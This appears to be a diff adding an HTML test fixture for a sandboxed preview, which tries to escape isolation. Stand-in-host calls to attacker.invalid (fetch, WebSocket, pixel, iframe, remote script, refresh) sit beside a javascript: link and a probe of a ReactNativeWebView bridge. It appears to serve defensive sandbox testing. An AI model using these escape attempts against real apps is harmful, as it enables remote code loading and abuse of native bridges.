@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+  <head>
+    <base href="https://attacker.invalid/">
+    <meta http-equiv="refresh" content="0;url=https://attacker.invalid/refresh">
+    <style>
+      body { font-family: sans-serif; }
+      #reveal { opacity: var(--reveal, 0); }
+    </style>
+  </head>
+  <body>
+    <label>Reveal <input id="slider" type="range" min="0" max="100" value="0"></label>
+    <div id="reveal">42</div>
+    <a href="#details" id="local-link">Details</a>
+    <a href="../data/results.csv">Results CSV</a>
+    <a href="https://example.com/findings">Findings</a>
+    <a href="javascript:document.body.dataset.pwned='yes'" id="script-link">Bad</a>
+    <div id="details"></div>
+    <script>
+      document.querySelector('#slider').addEventListener('input', (event) => {
+        document.documentElement.style.setProperty('--reveal', String(Number(event.target.value) / 100));
+      });
+      for (const attempt of [
+        () => fetch('https://attacker.invalid/fetch'),
+        () => new WebSocket('wss://attacker.invalid/socket'),
+        () => { const image = new Image(); image.src = 'https://attacker.invalid/pixel'; },
+        () => { const frame = document.createElement('iframe'); frame.src = 'https://attacker.invalid/frame'; document.body.append(frame); },
+        () => { const script = document.createElement('script'); script.src = 'https://attacker.invalid/script.js'; document.body.append(script); },
+      ]) {
+        try { attempt(); } catch (_) {}
+      }
+      document.body.dataset.bridge = String(typeof window.ReactNativeWebView);
+      try { window.ReactNativeWebView?.postMessage('{"type":"remux/request"}'); } catch (_) {}
+      try { localStorage.setItem('preview-test', 'isolated-origin-only'); } catch (_) {}
+    </script>
+  </body>
+</html>
